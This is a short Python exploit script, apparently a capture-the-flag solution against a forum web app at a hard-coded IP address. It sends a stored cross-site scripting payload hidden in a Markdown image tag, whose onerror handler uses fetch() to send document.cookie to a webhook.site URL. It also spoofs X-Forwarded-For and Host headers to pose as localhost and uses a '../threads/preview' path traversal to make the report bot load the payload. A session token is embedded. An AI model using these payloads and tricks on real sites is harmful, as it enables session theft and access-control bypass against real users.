import requests as r

PAYLOAD = "![flag](https://www.example.com/image.png\"onerror=\""\
           "fetch('https://webhook.site/b443e55e-8af4-42c9-a154-441b68275c84/flag?'+document.cookie))"

COOKIE= "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9." \
        "eyJpZCI6MTAsInVzZXJuYW1lIjoidXNlciIsInJlcHV0YXRpb24iO" \
        "jAsImNyZWRpdHMiOjEwMCwidXNlcl9yb2xlIjoiTmV3YmllIiwiYXZhdGFyIjoibmV" \
        "3YmllLndlYnAiLCJqb2luZWQiOiIyMDIyLTEwLTAzIDEyOjUzOjEzIiwiaWF0IjoxNjY0O" \
        "DAxNjA0fQ.kZeLICIFJw0k3xiGgm6iCeAz10HyZd1ixyxeIxrW464"

report_endpoint = "http://64.227.43.207:31335/api/report"
threads_preview_endpoint = "http://64.227.43.207:31335/threads/preview"

trigger = {
    "post_id": "../threads/preview"
}
headers = {
    "Cookie": "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAsInVzZXJuYW1lIjoidXNlciIsInJlcHV0YXRpb24iOjAsImNyZWRpdHMiOjEwMCwidXNlcl9yb2xlIjoiTmV3YmllIiwiYXZhdGFyIjoibmV3YmllLndlYnAiLCJqb2luZWQiOiIyMDIyLTEwLTAzIDEyOjUzOjEzIiwiaWF0IjoxNjY0ODAxNjA0fQ.kZeLICIFJw0k3xiGgm6iCeAz10HyZd1ixyxeIxrW464",
    "X-Forwarded-For": "127.0.0.1",
    "Host": "127.0.0.1:1337"
}
data = {
    "title": "Give me da Flag!",
    "content": PAYLOAD
}

req = r.post(threads_preview_endpoint, headers=headers, data=data)
req = r.post(report_endpoint, headers=headers, json=trigger)
print(req.text)
